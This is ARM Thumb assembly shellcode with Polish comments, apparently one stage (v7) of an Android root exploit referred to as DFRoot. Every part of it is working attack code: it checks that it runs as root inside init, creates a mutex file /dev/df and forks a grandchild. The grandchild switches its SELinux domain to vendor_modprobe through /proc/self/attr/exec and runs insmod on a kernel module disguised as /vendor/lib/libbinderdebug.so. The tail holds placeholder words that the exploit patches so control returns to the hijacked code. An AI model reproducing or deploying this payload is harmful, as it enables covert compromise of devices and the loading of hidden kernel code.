.syntax unified
.thumb
.arch armv7-a

/* v7: wariant v6 bez diagnostyki (/dev/dxw, dxs, dxb0..3).
 * Exploit czyta tylko /dev/df, /dev/dfm0 i /dev/dfm6. Ogon z DEAD0001 /
 * DEAD0002 zostaje, bo exploit podmienia te slowa na first_insn i skok powrotny.
 * Mutex, fork, wnuk i execve jak w v6.
 */

.global _start
.thumb_func
_start:
    push    {r0-r7, lr}

    mov     r7, #24         /* getuid */
    svc     #0
    cmp     r0, #0
    bne     .Lrestore

    movw    r7, #224        /* gettid */
    svc     #0
    cmp     r0, #1
    bne     .Lrestore

    /* Mutex: O_WRONLY|O_CREAT|O_EXCL, bez unlink */
    adr     r0, .Ldev_df
    movw    r1, #0xC1
    movw    r2, #0x1A4
    mov     r7, #5
    svc     #0
    cmp     r0, #0
    blt     .Lrestore
    mov     r7, #6
    svc     #0

    /* fork: rodzic wraca do init, dziecko = worker */
    mov     r7, #2
    svc     #0
    cmp     r0, #0
    bne     .Lrestore

    /* worker: fork wnuka, czeka na niego, konczy */
    mov     r7, #2
    svc     #0
    cmp     r0, #0
    beq     .Lgrandchild
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    mov     r7, #114        /* wait4(pid, NULL, 0, NULL), pid juz jest w r0 */
    svc     #0
    mov     r0, #0
    mov     r7, #1
    svc     #0

    /* Wnuk: przejscie domeny + insmod */
.Lgrandchild:
    adr     r0, .Lattr_exec
    mov     r1, #1          /* O_WRONLY */
    mov     r7, #5
    svc     #0
    cmp     r0, #0
    blt     .Ldo_execve
    mov     r4, r0
    adr     r1, .Lmodprobe_ctx
    mov     r2, #23         /* z NUL, jak w DFRoot */
    mov     r0, r4
    mov     r7, #4          /* write */
    svc     #0
    mov     r0, r4
    mov     r7, #6          /* close */
    svc     #0

.Ldo_execve:
    /* argv = [insmod, KO, NULL] */
    mov     r0, #0
    push    {r0}
    adr     r0, .Lko_path
    push    {r0}
    adr     r0, .Linsmod_path
    push    {r0}

    adr     r0, .Linsmod_path
    mov     r1, sp
    mov     r2, #0
    mov     r7, #11         /* execve */
    svc     #0

    /* execve nie wrocil: kod bledu jako status wnuka */
    rsb     r0, r0, #0
    mov     r7, #1
    svc     #0

.Lrestore:
    pop     {r0-r7, lr}
    b       .Lreturn

.align 2
.Ldev_df:        .asciz "/dev/df"
.align 2
.Lattr_exec:     .asciz "/proc/self/attr/exec"
.align 2
.Lmodprobe_ctx:  .asciz "u:r:vendor_modprobe:s0"
.align 2
.Linsmod_path:   .asciz "/vendor/bin/insmod"
.align 2
.Lko_path:       .asciz "/vendor/lib/libbinderdebug.so"

.align 2
.Lreturn:
    .word 0xDEAD0001
    .word 0xDEAD0002
